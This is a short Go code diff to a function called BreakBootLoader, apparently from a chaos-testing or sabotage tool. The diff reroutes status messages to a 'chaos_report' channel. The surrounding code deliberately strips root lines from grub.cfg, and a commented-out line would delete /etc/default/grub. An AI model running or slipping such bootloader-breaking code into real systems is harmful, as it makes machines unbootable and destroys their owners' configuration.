@@ -13,7 +13,8 @@ import (
 func BreakBootLoader() error {
 	grubPath := findGrubCfg()
 	if grubPath == "" {
-		comm.ReportToMonitor("No grub.cfg found!")
+		//comm.ReportToMonitor("No grub.cfg found!")
+		comm.SendMessage("chaos_report", "No grub.cfg found!")
 		return logError("No grub.cfg found!")
 	}
 
@@ -22,7 +23,8 @@ func BreakBootLoader() error {
 //	if err := os.Remove("/etc/default/grub"); err != nil && !os.IsNotExist(err) {
 //		log.Printf("Failed to delete /etc/default/grub: %v", err)
 //	} else {
-		comm.ReportToMonitor("Deleted /etc/default/grub")
+		//comm.ReportToMonitor("Deleted /etc/default/grub")
+		comm.SendMessage("chaos_report", "Deleted /etc/default/grub")
 //	}
 
 	if err := removeRootLines(grubPath); err != nil {
